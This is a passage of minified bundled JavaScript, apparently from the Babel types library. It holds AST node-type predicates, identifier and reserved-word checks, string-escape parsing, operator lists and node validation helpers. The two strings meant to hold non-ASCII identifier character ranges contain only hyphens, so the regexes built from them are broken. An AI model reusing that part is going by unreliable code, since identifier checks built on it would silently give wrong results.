Of(X,J){if(!X)return!1;switch(X.type){case"AnyTypeAnnotation":case"ArrayTypeAnnotation":case"BooleanTypeAnnotation":case"BooleanLiteralTypeAnnotation":case"NullLiteralTypeAnnotation":case"ExistsTypeAnnotation":case"FunctionTypeAnnotation":case"GenericTypeAnnotation":case"InterfaceTypeAnnotation":case"IntersectionTypeAnnotation":case"MixedTypeAnnotation":case"EmptyTypeAnnotation":case"NullableTypeAnnotation":case"NumberLiteralTypeAnnotation":case"NumberTypeAnnotation":case"ObjectTypeAnnotation":case"StringLiteralTypeAnnotation":case"StringTypeAnnotation":case"SymbolTypeAnnotation":case"ThisTypeAnnotation":case"TupleTypeAnnotation":case"TypeofTypeAnnotation":case"UnionTypeAnnotation":case"VoidTypeAnnotation":case"IndexedAccessType":case"OptionalIndexedAccessType":break;default:return!1}return J==null||I.default(X,J)}function Rf(X,J){if(!X)return!1;switch(X.type){case"AnyTypeAnnotation":case"BooleanTypeAnnotation":case"NullLiteralTypeAnnotation":case"MixedTypeAnnotation":case"EmptyTypeAnnotation":case"NumberTypeAnnotation":case"StringTypeAnnotation":case"SymbolTypeAnnotation":case"ThisTypeAnnotation":case"VoidTypeAnnotation":break;default:return!1}return J==null||I.default(X,J)}function Af(X,J){if(!X)return!1;switch(X.type){case"DeclareClass":case"DeclareFunction":case"DeclareInterface":case"DeclareModule":case"DeclareModuleExports":case"DeclareTypeAlias":case"DeclareOpaqueType":case"DeclareVariable":case"DeclareExportDeclaration":case"DeclareExportAllDeclaration":case"InterfaceDeclaration":case"OpaqueType":case"TypeAlias":break;default:return!1}return J==null||I.default(X,J)}function Nf(X,J){if(!X)return!1;switch(X.type){case"DeclaredPredicate":case"InferredPredicate":break;default:return!1}return J==null||I.default(X,J)}function Lf(X,J){if(!X)return!1;switch(X.type){case"EnumBooleanBody":case"EnumNumberBody":case"EnumStringBody":case"EnumSymbolBody":break;default:return!1}return J==null||I.default(X,J)}function Df(X,J){if(!X)return!1;switch(X.type){case"EnumBooleanMember":case"EnumNumberMember":case"EnumStringMember":case"EnumDefaultedMember":break;default:return!1}return J==null||I.default(X,J)}function wf(X,J){if(!X)return!1;switch(X.type){case"JSXAttribute":case"JSXClosingElement":case"JSXElement":case"JSXEmptyExpression":case"JSXExpressionContainer":case"JSXSpreadChild":case"JSXIdentifier":case"JSXMemberExpression":case"JSXNamespacedName":case"JSXOpeningElement":case"JSXSpreadAttribute":case"JSXText":case"JSXFragment":case"JSXOpeningFragment":case"JSXClosingFragment":break;default:return!1}return J==null||I.default(X,J)}function If(X,J){if(!X)return!1;switch(X.type){case"Noop":case"Placeholder":case"V8IntrinsicIdentifier":break;default:return!1}return J==null||I.default(X,J)}function Cf(X,J){if(!X)return!1;switch(X.type){case"TSParameterProperty":case"TSDeclareFunction":case"TSDeclareMethod":case"TSQualifiedName":case"TSCallSignatureDeclaration":case"TSConstructSignatureDeclaration":case"TSPropertySignature":case"TSMethodSignature":case"TSIndexSignature":case"TSAnyKeyword":case"TSBooleanKeyword":case"TSBigIntKeyword":case"TSIntrinsicKeyword":case"TSNeverKeyword":case"TSNullKeyword":case"TSNumberKeyword":case"TSObjectKeyword":case"TSStringKeyword":case"TSSymbolKeyword":case"TSUndefinedKeyword":case"TSUnknownKeyword":case"TSVoidKeyword":case"TSThisType":case"TSFunctionType":case"TSConstructorType":case"TSTypeReference":case"TSTypePredicate":case"TSTypeQuery":case"TSTypeLiteral":case"TSArrayType":case"TSTupleType":case"TSOptionalType":case"TSRestType":case"TSNamedTupleMember":case"TSUnionType":case"TSIntersectionType":case"TSConditionalType":case"TSInferType":case"TSParenthesizedType":case"TSTypeOperator":case"TSIndexedAccessType":case"TSMappedType":case"TSTemplateLiteralType":case"TSLiteralType":case"TSExpressionWithTypeArguments":case"TSInterfaceDeclaration":case"TSInterfaceBody":case"TSTypeAliasDeclaration":case"TSInstantiationExpression":case"TSAsExpression":case"TSSatisfiesExpression":case"TSTypeAssertion":case"TSEnumBody":case"TSEnumDeclaration":case"TSEnumMember":case"TSModuleDeclaration":case"TSModuleBlock":case"TSImportType":case"TSImportEqualsDeclaration":case"TSExternalModuleReference":case"TSNonNullExpression":case"TSExportAssignment":case"TSNamespaceExportDeclaration":case"TSTypeAnnotation":case"TSTypeParameterInstantiation":case"TSTypeParameterDeclaration":case"TSTypeParameter":break;default:return!1}return J==null||I.default(X,J)}function Pf(X,J){if(!X)return!1;switch(X.type){case"TSCallSignatureDeclaration":case"TSConstructSignatureDeclaration":case"TSPropertySignature":case"TSMethodSignature":case"TSIndexSignature":break;default:return!1}return J==null||I.default(X,J)}function Sf(X,J){if(!X)return!1;switch(X.type){case"TSAnyKeyword":case"TSBooleanKeyword":case"TSBigIntKeyword":case"TSIntrinsicKeyword":case"TSNeverKeyword":case"TSNullKeyword":case"TSNumberKeyword":case"TSObjectKeyword":case"TSStringKeyword":case"TSSymbolKeyword":case"TSUndefinedKeyword":case"TSUnknownKeyword":case"TSVoidKeyword":case"TSThisType":case"TSFunctionType":case"TSConstructorType":case"TSTypeReference":case"TSTypePredicate":case"TSTypeQuery":case"TSTypeLiteral":case"TSArrayType":case"TSTupleType":case"TSOptionalType":case"TSRestType":case"TSUnionType":case"TSIntersectionType":case"TSConditionalType":case"TSInferType":case"TSParenthesizedType":case"TSTypeOperator":case"TSIndexedAccessType":case"TSMappedType":case"TSTemplateLiteralType":case"TSLiteralType":case"TSExpressionWithTypeArguments":case"TSImportType":break;default:return!1}return J==null||I.default(X,J)}function Tf(X,J){if(!X)return!1;switch(X.type){case"TSAnyKeyword":case"TSBooleanKeyword":case"TSBigIntKeyword":case"TSIntrinsicKeyword":case"TSNeverKeyword":case"TSNullKeyword":case"TSNumberKeyword":case"TSObjectKeyword":case"TSStringKeyword":case"TSSymbolKeyword":case"TSUndefinedKeyword":case"TSUnknownKeyword":case"TSVoidKeyword":case"TSThisType":case"TSTemplateLiteralType":case"TSLiteralType":break;default:return!1}return J==null||I.default(X,J)}function _f(X,J){if(w5.default("isNumberLiteral","isNumericLiteral"),!X)return!1;if(X.type!=="NumberLiteral")return!1;return J==null||I.default(X,J)}function Ef(X,J){if(w5.default("isRegexLiteral","isRegExpLiteral"),!X)return!1;if(X.type!=="RegexLiteral")return!1;return J==null||I.default(X,J)}function $f(X,J){if(w5.default("isRestProperty","isRestElement"),!X)return!1;if(X.type!=="RestProperty")return!1;return J==null||I.default(X,J)}function kf(X,J){if(w5.default("isSpreadProperty","isSpreadElement"),!X)return!1;if(X.type!=="SpreadProperty")return!1;return J==null||I.default(X,J)}function bf(X,J){return w5.default("isModuleDeclaration","isImportOrExportDeclaration"),uV(X,J)}});var qW=c((pV)=>{Object.defineProperty(pV,"__esModule",{value:!0});pV.default=Ac;var _X=i0();function lV(X){return _X.isMemberExpression(X)||_X.isMetaProperty(X)}function Ac(X,J,Q){if(!lV(X))return!1;let Y=Array.isArray(J)?J:J.split("."),W=[],z;for(z=X;lV(z);z=(G=z.object)!=null?G:z.meta){var G;W.push(z.property)}if(W.push(z),W.length<Y.length)return!1;if(!Q&&W.length>Y.length)return!1;for(let H=0,U=W.length-1;H<Y.length;H++,U--){let K=W[U],V;if(_X.isIdentifier(K))V=K.name;else if(_X.isStringLiteral(K))V=K.value;else if(_X.isThisExpression(K))V="this";else if(_X.isSuper(K))V="super";else if(_X.isPrivateName(K))V="#"+K.id.name;else return!1;if(Y[H]!==V)return!1}return!0}});var ZW=c((dV)=>{Object.defineProperty(dV,"__esModule",{value:!0});dV.default=Dc;var Lc=qW();function Dc(X,J){let Q=X.split(".");return(Y)=>Lc.default(Y,Q,J)}});var nV=c((iV)=>{Object.defineProperty(iV,"__esModule",{value:!0});iV.default=void 0;var Ic=ZW(),Cc=Ic.default("React.Component"),cp1=iV.default=Cc});var sV=c((aV)=>{Object.defineProperty(aV,"__esModule",{value:!0});aV.default=Pc;function Pc(X){return!!X&&/^[a-z]/.test(X)}});var M4=c((tV)=>{Object.defineProperty(tV,"__esModule",{value:!0});tV.default=Tc;var oV=Y8();function Tc(X,J){if(X===J)return!0;if(X==null)return!1;if(oV.ALIAS_KEYS[J])return!1;let Q=oV.FLIPPED_ALIAS_KEYS[J];if(Q!=null&&Q.includes(X))return!0;return!1}});var MW=c((eV)=>{Object.defineProperty(eV,"__esModule",{value:!0});eV.default=$c;var Ec=Y8();function $c(X,J){if(X===J)return!0;let Q=Ec.PLACEHOLDERS_ALIAS[X];if(Q!=null&&Q.includes(J))return!0;return!1}});var cJ=c((XB)=>{Object.defineProperty(XB,"__esModule",{value:!0});XB.default=gc;var bc=Z4(),vc=M4(),xc=MW(),fc=Y8();function gc(X,J,Q){if(!J)return!1;if(!vc.default(J.type,X)){if(!Q&&J.type==="Placeholder"&&X in fc.FLIPPED_ALIAS_KEYS)return xc.default(J.expectedNode,X);return!1}if(Q===void 0)return!0;else return bc.default(J,Q)}});var zB=c((GB)=>{Object.defineProperty(GB,"__esModule",{value:!0});GB.isIdentifierChar=WB;GB.isIdentifierName=cc;GB.isIdentifierStart=YB;var jW="------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------",JB="-----------------------------------------------------------------------------------------------------------------------------------------------------",yc=new RegExp("["+jW+"]"),mc=new RegExp("["+jW+JB+"]");jW=JB=null;var QB=[0,11,2,25,2,18,2,1,2,14,3,13,35,122,70,52,268,28,4,48,48,31,14,29,6,37,11,29,3,35,5,7,2,4,43,157,19,35,5,35,5,39,9,51,13,10,2,14,2,6,2,1,2,10,2,14,2,6,2,1,4,51,13,310,10,21,11,7,25,5,2,41,2,8,70,5,3,0,2,43,2,1,4,0,3,22,11,22,10,30,66,18,2,1,11,21,11,25,71,55,7,1,65,0,16,3,2,2,2,28,43,28,4,28,36,7,2,27,28,53,11,21,11,18,14,17,111,72,56,50,14,50,14,35,39,27,10,22,251,41,7,1,17,2,60,28,11,0,9,21,43,17,47,20,28,22,13,52,58,1,3,0,14,44,33,24,27,35,30,0,3,0,9,34,4,0,13,47,15,3,22,0,2,0,36,17,2,24,20,1,64,6,2,0,2,3,2,14,2,9,8,46,39,7,3,1,3,21,2,6,2,1,2,4,4,0,19,0,13,4,31,9,2,0,3,0,2,37,2,0,26,0,2,0,45,52,19,3,21,2,31,47,21,1,2,0,185,46,42,3,37,47,21,0,60,42,14,0,72,26,38,6,186,43,117,63,32,7,3,0,3,7,2,1,2,23,16,0,2,0,95,7,3,38,17,0,2,0,29,0,11,39,8,0,22,0,12,45,20,0,19,72,200,32,32,8,2,36,18,0,50,29,113,6,2,1,2,37,22,0,26,5,2,1,2,31,15,0,328,18,16,0,2,12,2,33,125,0,80,921,103,110,18,195,2637,96,16,1071,18,5,26,3994,6,582,6842,29,1763,568,8,30,18,78,18,29,19,47,17,3,32,20,6,18,433,44,212,63,129,74,6,0,67,12,65,1,2,0,29,6135,9,1237,42,9,8936,3,2,6,2,1,2,290,16,0,30,2,3,0,15,3,9,395,2309,106,6,12,4,8,8,9,5991,84,2,70,2,1,3,0,3,1,3,3,2,11,2,0,2,6,2,64,2,3,3,7,2,6,2,27,2,3,2,4,2,0,4,6,2,339,3,24,2,24,2,30,2,24,2,30,2,24,2,30,2,24,2,30,2,24,2,7,1845,30,7,5,262,61,147,44,11,6,17,0,322,29,19,43,485,27,229,29,3,0,496,6,2,3,2,1,2,14,2,196,60,67,8,0,1205,3,2,26,2,1,2,0,3,0,2,9,2,3,2,0,2,0,7,0,5,0,2,0,2,0,2,2,2,1,2,0,3,0,2,0,2,0,2,0,2,0,2,1,2,0,3,3,2,6,2,3,2,3,2,0,2,9,2,16,6,2,2,4,2,16,4421,42719,33,4153,7,221,3,5761,15,7472,16,621,2467,541,1507,4938,6,4191],uc=[509,0,227,0,150,4,294,9,1368,2,2,1,6,3,41,2,5,0,166,1,574,3,9,9,7,9,32,4,318,1,80,3,71,10,50,3,123,2,54,14,32,10,3,1,11,3,46,10,8,0,46,9,7,2,37,13,2,9,6,1,45,0,13,2,49,13,9,3,2,11,83,11,7,0,3,0,158,11,6,9,7,3,56,1,2,6,3,1,3,2,10,0,11,1,3,6,4,4,68,8,2,0,3,0,2,3,2,4,2,0,15,1,83,17,10,9,5,0,82,19,13,9,214,6,3,8,28,1,83,16,16,9,82,12,9,9,7,19,58,14,5,9,243,14,166,9,71,5,2,1,3,3,2,0,2,1,13,9,120,6,3,6,4,0,29,9,41,6,2,3,9,0,10,10,47,15,343,9,54,7,2,7,17,9,57,21,2,13,123,5,4,0,2,1,2,6,2,0,9,9,49,4,2,1,2,4,9,9,330,3,10,1,2,0,49,6,4,4,14,10,5350,0,7,14,11465,27,2343,9,87,9,39,4,60,6,26,9,535,9,470,0,2,54,8,3,82,0,12,1,19628,1,4178,9,519,45,3,22,543,4,4,5,9,7,3,6,31,3,149,2,1418,49,513,54,5,49,9,0,15,0,23,4,2,14,1361,6,2,16,3,6,2,1,2,4,101,0,161,6,10,9,357,0,62,13,499,13,245,1,2,9,726,6,110,6,6,9,4759,9,787719,239];function FW(X,J){let Q=65536;for(let Y=0,W=J.length;Y<W;Y+=2){if(Q+=J[Y],Q>X)return!1;if(Q+=J[Y+1],Q>=X)return!0}return!1}function YB(X){if(X<65)return X===36;if(X<=90)return!0;if(X<97)return X===95;if(X<=122)return!0;if(X<=65535)return X>=170&&yc.test(String.fromCharCode(X));return FW(X,QB)}function WB(X){if(X<48)return X===36;if(X<58)return!0;if(X<65)return!1;if(X<=90)return!0;if(X<97)return X===95;if(X<=122)return!0;if(X<=65535)return X>=170&&mc.test(String.fromCharCode(X));return FW(X,QB)||FW(X,uc)}function cc(X){let J=!0;for(let Q=0;Q<X.length;Q++){let Y=X.charCodeAt(Q);if((Y&64512)===55296&&Q+1<X.length){let W=X.charCodeAt(++Q);if((W&64512)===56320)Y=65536+((Y&1023)<<10)+(W&1023)}if(J){if(J=!1,!YB(Y))return!1}else if(!WB(Y))return!1}return!J}});var BB=c((VB)=>{Object.defineProperty(VB,"__esModule",{value:!0});VB.isKeyword=sc;VB.isReservedWord=HB;VB.isStrictBindOnlyReservedWord=KB;VB.isStrictBindReservedWord=ac;VB.isStrictReservedWord=UB;var OW={keyword:["break","case","catch","continue","debugger","default","do","else","finally","for","function","if","return","switch","throw","try","var","const","while","with","new","this","super","class","extends","export","import","null","true","false","in","instanceof","typeof","void","delete"],strict:["implements","interface","let","package","private","protected","public","static","yield"],strictBind:["eval","arguments"]},ic=new Set(OW.keyword),rc=new Set(OW.strict),nc=new Set(OW.strictBind);function HB(X,J){return J&&X==="await"||X==="enum"}function UB(X,J){return HB(X,J)||rc.has(X)}function KB(X){return nc.has(X)}function ac(X,J){return UB(X,J)||KB(X)}function sc(X){return ic.has(X)}});var C5=c((n8)=>{Object.defineProperty(n8,"__esModule",{value:!0});Object.defineProperty(n8,"isIdentifierChar",{enumerable:!0,get:function(){return RW.isIdentifierChar}});Object.defineProperty(n8,"isIdentifierName",{enumerable:!0,get:function(){return RW.isIdentifierName}});Object.defineProperty(n8,"isIdentifierStart",{enumerable:!0,get:function(){return RW.isIdentifierStart}});Object.defineProperty(n8,"isKeyword",{enumerable:!0,get:function(){return I5.isKeyword}});Object.defineProperty(n8,"isReservedWord",{enumerable:!0,get:function(){return I5.isReservedWord}});Object.defineProperty(n8,"isStrictBindOnlyReservedWord",{enumerable:!0,get:function(){return I5.isStrictBindOnlyReservedWord}});Object.defineProperty(n8,"isStrictBindReservedWord",{enumerable:!0,get:function(){return I5.isStrictBindReservedWord}});Object.defineProperty(n8,"isStrictReservedWord",{enumerable:!0,get:function(){return I5.isStrictReservedWord}});var RW=zB(),I5=BB()});var lJ=c((qB)=>{Object.defineProperty(qB,"__esModule",{value:!0});qB.default=Ql;var AW=C5();function Ql(X,J=!0){if(typeof X!=="string")return!1;if(J){if(AW.isKeyword(X)||AW.isStrictReservedWord(X,!0))return!1}return AW.isIdentifierName(X)}});var OB=c((jB)=>{Object.defineProperty(jB,"__esModule",{value:!0});jB.readCodePoint=FB;jB.readInt=MB;jB.readStringContents=Gl;var Wl=function X(J){return J>=48&&J<=57},ZB={decBinOct:new Set([46,66,69,79,95,98,101,111]),hex:new Set([46,88,95,120])},F4={bin:(X)=>X===48||X===49,oct:(X)=>X>=48&&X<=55,dec:(X)=>X>=48&&X<=57,hex:(X)=>X>=48&&X<=57||X>=65&&X<=70||X>=97&&X<=102};function Gl(X,J,Q,Y,W,z){let G=Q,H=Y,U=W,K="",V=null,B=Q,{length:Z}=J;for(;;){if(Q>=Z){z.unterminated(G,H,U),K+=J.slice(B,Q);break}let M=J.charCodeAt(Q);if(zl(X,M,J,Q)){K+=J.slice(B,Q);break}if(M===92){K+=J.slice(B,Q);let F=Hl(J,Q,Y,W,X==="template",z);if(F.ch===null&&!V)V={pos:Q,lineStart:Y,curLine:W};else K+=F.ch;({pos:Q,lineStart:Y,curLine:W}=F),B=Q}else if(M===8232||M===8233)++Q,++W,Y=Q;else if(M===10||M===13)if(X==="template"){if(K+=J.slice(B,Q)+`
`,++Q,M===13&&J.charCodeAt(Q)===10)++Q;++W,B=Y=Q}else z.unterminated(G,H,U);else++Q}return{pos:Q,str:K,firstInvalidLoc:V,lineStart:Y,curLine:W,containsInvalid:!!V}}function zl(X,J,Q,Y){if(X==="template")return J===96||J===36&&Q.charCodeAt(Y+1)===123;return J===(X==="double"?34:39)}function Hl(X,J,Q,Y,W,z){let G=!W;J++;let H=(K)=>({pos:J,ch:K,lineStart:Q,curLine:Y}),U=X.charCodeAt(J++);switch(U){case 110:return H(`
`);case 114:return H("\r");case 120:{let K;return{code:K,pos:J}=NW(X,J,Q,Y,2,!1,G,z),H(K===null?null:String.fromCharCode(K))}case 117:{let K;return{code:K,pos:J}=FB(X,J,Q,Y,G,z),H(K===null?null:String.fromCodePoint(K))}case 116:return H("\t");case 98:return H("\b");case 118:return H("\v");case 102:return H("\f");case 13:if(X.charCodeAt(J)===10)++J;case 10:Q=J,++Y;case 8232:case 8233:return H("");case 56:case 57:if(W)return H(null);else z.strictNumericEscape(J-1,Q,Y);default:if(U>=48&&U<=55){let K=J-1,B=/^[0-7]+/.exec(X.slice(K,J+2))[0],Z=parseInt(B,8);if(Z>255)B=B.slice(0,-1),Z=parseInt(B,8);J+=B.length-1;let M=X.charCodeAt(J);if(B!=="0"||M===56||M===57)if(W)return H(null);else z.strictNumericEscape(K,Q,Y);return H(String.fromCharCode(Z))}return H(String.fromCharCode(U))}}function NW(X,J,Q,Y,W,z,G,H){let U=J,K;if({n:K,pos:J}=MB(X,J,Q,Y,16,W,z,!1,H,!G),K===null)if(G)H.invalidEscapeSequence(U,Q,Y);else J=U-1;return{code:K,pos:J}}function MB(X,J,Q,Y,W,z,G,H,U,K){let V=J,B=W===16?ZB.hex:ZB.decBinOct,Z=W===16?F4.hex:W===10?F4.dec:W===8?F4.oct:F4.bin,M=!1,F=0;for(let j=0,O=z==null?1/0:z;j<O;++j){let N=X.charCodeAt(J),A;if(N===95&&H!=="bail"){let D=X.charCodeAt(J-1),S=X.charCodeAt(J+1);if(!H){if(K)return{n:null,pos:J};U.numericSeparatorInEscapeSequence(J,Q,Y)}else if(Number.isNaN(S)||!Z(S)||B.has(D)||B.has(S)){if(K)return{n:null,pos:J};U.unexpectedNumericSeparator(J,Q,Y)}++J;continue}if(N>=97)A=N-97+10;else if(N>=65)A=N-65+10;else if(Wl(N))A=N-48;else A=1/0;if(A>=W)if(A<=9&&K)return{n:null,pos:J};else if(A<=9&&U.invalidDigit(J,Q,Y,W))A=0;else if(G)A=0,M=!0;else break;++J,F=F*W+A}if(J===V||z!=null&&J-V!==z||M)return{n:null,pos:J};return{n:F,pos:J}}function FB(X,J,Q,Y,W,z){let G=X.charCodeAt(J),H;if(G===123){if(++J,{code:H,pos:J}=NW(X,J,Q,Y,X.indexOf("}",J)-J,!0,W,z),++J,H!==null&&H>1114111)if(W)z.invalidCodePoint(J,Q,Y);else return{code:null,pos:J}}else({code:H,pos:J}=NW(X,J,Q,Y,4,!1,W,z));return{code:H,pos:J}}});var pJ=c((AB)=>{Object.defineProperty(AB,"__esModule",{value:!0});AB.UPDATE_OPERATORS=AB.UNARY_OPERATORS=AB.STRING_UNARY_OPERATORS=AB.STATEMENT_OR_BLOCK_KEYS=AB.NUMBER_UNARY_OPERATORS=AB.NUMBER_BINARY_OPERATORS=AB.LOGICAL_OPERATORS=AB.INHERIT_KEYS=AB.FOR_INIT_KEYS=AB.FLATTENABLE_KEYS=AB.EQUALITY_BINARY_OPERATORS=AB.COMPARISON_BINARY_OPERATORS=AB.COMMENT_KEYS=AB.BOOLEAN_UNARY_OPERATORS=AB.BOOLEAN_NUMBER_BINARY_OPERATORS=AB.BOOLEAN_BINARY_OPERATORS=AB.BINARY_OPERATORS=AB.ASSIGNMENT_OPERATORS=void 0;var ep1=AB.STATEMENT_OR_BLOCK_KEYS=["consequent","body","alternate"],Xd1=AB.FLATTENABLE_KEYS=["body","expressions"],Jd1=AB.FOR_INIT_KEYS=["left","init"],Qd1=AB.COMMENT_KEYS=["leadingComments","trailingComments","innerComments"],Bl=AB.LOGICAL_OPERATORS=["||","&&","??"],Yd1=AB.UPDATE_OPERATORS=["++","--"],ql=AB.BOOLEAN_NUMBER_BINARY_OPERATORS=[">","<",">=","<="],Zl=AB.EQUALITY_BINARY_OPERATORS=["==","===","!=","!=="],Ml=AB.COMPARISON_BINARY_OPERATORS=[...Zl,"in","instanceof"],Fl=AB.BOOLEAN_BINARY_OPERATORS=[...Ml,...ql],RB=AB.NUMBER_BINARY_OPERATORS=["-","/","%","*","**","&","|",">>",">>>","<<","^"],Wd1=AB.BINARY_OPERATORS=["+",...RB,...Fl,"|>"],Gd1=AB.ASSIGNMENT_OPERATORS=["=","+=",...RB.map((X)=>X+"="),...Bl.map((X)=>X+"=")],jl=AB.BOOLEAN_UNARY_OPERATORS=["delete","!"],Ol=AB.NUMBER_UNARY_OPERATORS=["+","-","~"],Rl=AB.STRING_UNARY_OPERATORS=["typeof"],zd1=AB.UNARY_OPERATORS=["void","throw",...jl,...Ol,...Rl],Hd1=AB.INHERIT_KEYS={optional:["typeAnnotation","typeParameters","returnType"],force:["start","loc","end"]};AB.BLOCK_SCOPED_SYMBOL=Symbol.for("var used to be block scoped"),AB.NOT_LOCAL_BINDING=Symbol.for("should not be considered a local binding")});var a8=c((SB)=>{Object.defineProperty(SB,"__esModule",{value:!0});SB.allExpandedTypes=SB.VISITOR_KEYS=SB.NODE_PARENT_VALIDATIONS=SB.NODE_FIELDS=SB.FLIPPED_ALIAS_KEYS=SB.DEPRECATED_KEYS=SB.BUILDER_KEYS=SB.ALIAS_KEYS=void 0;SB.arrayOf=DB;SB.arrayOfType=wB;SB.assertEach=IB;SB.assertNodeOrValueType=nl;SB.assertNodeType=O4;SB.assertOneOf=il;SB.assertOptionalChainStart=sl;SB.assertShape=al;SB.assertValueType=IW;SB.chain=CB;SB.default=PB;SB.defineAliasedType=el;SB.validate=wW;SB.validateArrayOfType=dl;SB.validateOptional=ll;SB.validateOptionalType=pl;SB.validateType=cl;var LB=cJ(),P5=R4(),fl=SB.VISITOR_KEYS={},gl=SB.ALIAS_KEYS={},LW=SB.FLIPPED_ALIAS_KEYS={},hl=SB.NODE_FIELDS={},yl=SB.BUILDER_KEYS={},ml=SB.DEPRECATED_KEYS={},ul=SB.NODE_PARENT_VALIDATIONS={};function j4(X){if(Array.isArray(X))return"array";else if(X===null)return"null";else return typeof X}function wW(X){return{validate:X}}function cl(...X){return wW(O4(...X))}function ll(X){return{validate:X,optional:!0}}function pl(...X){return{validate:O4(...X),optional:!0}}function DB(X){return CB(IW("array"),IB(X))}function wB(...X){return DB(O4(...X))}function dl(...X){return wW(wB(...X))}function IB(X){let J=process.env.BABEL_TYPES_8_BREAKING?P5.validateChild:()=>{};function Q(Y,W,z){if(!Array.isArray(z))return;let G=0,H={toString(){return`${W}[${G}]`}};for(;G<z.length;G++){let U=z[G];X(Y,H,U),J(Y,H,U)}}return Q.each=X,Q}function il(...X){function J(Q,Y,W){if(!X.includes(W))throw new TypeError(`Property ${Y} expected value to be one of ${JSON.stringify(X)} but got ${JSON.stringify(W)}`)}return J.oneOf=X,J}var rl=SB.allExpandedTypes=[];function O4(...X){let J=new Set;rl.push({types:X,set:J});function Q(Y,W,z){let G=z==null?void 0:z.type;if(G!=null){if(J.has(G)){P5.validateChild(Y,W,z);return}if(G==="Placeholder"){for(let H of X)if(LB.default(H,z)){P5.validateChild(Y,W,z);return}}}throw new TypeError(`Property ${W} of ${Y.type} expected node to be of a type ${JSON.stringify(X)} but instead got ${JSON.stringify(G)}`)}return Q.oneOfNodeTypes=X,Q}function nl(...X){function J(Q,Y,W){let z=j4(W);for(let G of X)if(z===G||LB.default(G,W)){P5.validateChild(Q,Y,W);return}throw new TypeError(`Property ${Y} of ${Q.type} expected node to be of a type ${JSON.stringify(X)} but instead got ${JSON.stringify(W==null?void 0:W.type)}`)}return J.oneOfNodeOrValueTypes=X,J}function IW(X){function J(Q,Y,W){if(j4(W)===X)return;throw new TypeError(`Property ${Y} expected type of ${X} but got ${j4(W)}`)}return J.type=X,J}function al(X){let J=Object.keys(X);function Q(Y,W,z){let G=[];for(let H of J)try{P5.validateField(Y,H,z[H],X[H])}catch(U){if(U instanceof TypeError){G.push(U.message);continue}throw U}if(G.length)throw new TypeError(`Property ${W} of ${Y.type} expected to have the following:
${G.join(`
`)}`)}return Q.shapeOf=X,Q}function sl(){function X(J){var Q;let Y=J;while(J){let{type:W}=Y;if(W==="OptionalCallExpression"){if(Y.optional)return;Y=Y.callee;continue}if(W==="OptionalMemberExpression"){if(Y.optional)return;Y=Y.object;continue}break}throw new TypeError(`Non-optional ${J.type} must chain from an optional OptionalMemberExpression or OptionalCallExpression. Found chain from ${(Q=Y)==null?void 0:Q.type}`)}return X}function CB(...X){function J(...Q){for(let Y of X)Y(...Q)}if(J.chainOf=X,X.length>=2&&"type"in X[0]&&X[0].type==="array"&&!("each"in X[1]))throw new Error('An assertValueType("array") validator can only be followed by an assertEach(...) validator.');return J}var ol=new Set(["aliases","builder","deprecatedAlias","fields","inherits","visitor","validate"]),tl=new Set(["default","optional","deprecated","validate"]),DW={};function el(...X){return(J,Q={})=>{let Y=Q.aliases;if(!Y){var W;if(Q.inherits)Y=(W=DW[Q.inherits].aliases)==null?void 0:W.slice();Y!=null||(Y=[]),Q.aliases=Y}let z=X.filter((G)=>!Y.includes(G));Y.unshift(...z),PB(J,Q)}}function PB(X,J={}){let Q=J.inherits&&DW[J.inherits]||{},Y=J.fields;if(!Y){if(Y={},Q.fields){let H=Object.getOwnPropertyNames(Q.fields);for(let U of H){let K=Q.fields[U],V=K.default;if(Array.isArray(V)?V.length>0:V&&typeof V==="object")throw new Error("field defaults can only be primitives or empty arrays currently");Y[U]={default:Array.isArray(V)?[]:V,optional:K.optional,deprecated:K.deprecated,validate:K.validate}}}}let W=J.visitor||Q.visitor||[],z=J.aliases||Q.aliases||[],G=J.builder||Q.builder||J.visitor||[];for(let H of Object.keys(J))if(!ol.has(H))throw new Error(`Unknown type option "${H}" on ${X}`);if(J.deprecatedAlias)ml[J.deprecatedAlias]=X;for(let H of W.concat(G))Y[H]=Y[H]||{};for(let H of Object.keys(Y)){let U=Y[H];if(U.default!==void 0&&!G.includes(H))U.optional=!0;if(U.default===void 0)U.default=null;else if(!U.validate&&U.default!=null)U.validate=IW(j4(U.default));for(let K of Object.keys(U))if(!tl.has(K))throw new Error(`Unknown field key "${K}" on ${X}.${H}`)}if(fl[X]=J.visitor=W,yl[X]=J.builder=G,hl[X]=J.fields=Y,gl[X]=J.aliases=z,z.forEach((H)=>{LW[H]=LW[H]||[],LW[H].push(X)}),J.validate)ul[X]=J.validate;DW[X]=J}});var S5=c(($B)=>{Object.defineProperty($B,"__esModule",{value:!0});$B.patternLikeCommon=$B.importAttributes=$B.functionTypeAnnotationCommon=$B.functionDeclarationCommon=$B.functionCommon=$B.classMethodOrPropertyCommon=$B.classMethodOrDeclareMethodCommon=void 0;var P9=cJ(),Ip=lJ(),_B=C5(),Cp=OB(),dJ=pJ(),C=a8(),A1=C.defineAliasedType("Standardized");A1("ArrayExpression",{fields:{elements:{validate:C.arrayOf(C.assertNodeOrValueType("null","Expression","SpreadElement")),default:!process.env.BABEL_TYPES_8_BREAKING?[]:void 0}},visitor:["elements"],aliases:["Expression"]});A1("AssignmentExpression",{fields:{operator:{validate:!process.env.BABEL_TYPES_8_BREAKING?C.assertValueType("string"):Object.assign(function(){let X=C.assertOneOf(...dJ.ASSIGNMENT_OPERATORS),J=C.assertOneOf("=");return function(Q,Y,W){(P9.default("Pattern",Q.left)?J:X)(Q,Y,W)}}(),{oneOf:dJ.ASSIGNMENT_OPERATORS})},left:{validate:!process.env.BABEL_TYPES_8_BREAKING?C.assertNodeType("LVal","OptionalMemberExpression"):C.assertNodeType("Identifier","MemberExpression","OptionalMemberExpression","ArrayPattern","ObjectPattern","TSAsExpression","TSSatisfiesExpression","TSTypeAssertion","TSNonNullExpression")},right:{validate:C.assertNodeType("Expression")}},builder:["operator","left","right"],visitor:["left","right"],aliases:["Expression"]});A1("BinaryExpression",{builder:["operator","left","right"],fields:{operator:{validate:C.assertOneOf(...dJ.BINARY_OPERATORS)},left:{validate:function(){let X=C.assertNodeType("Expression"),J=C.assertNodeType("Expression","PrivateName");return 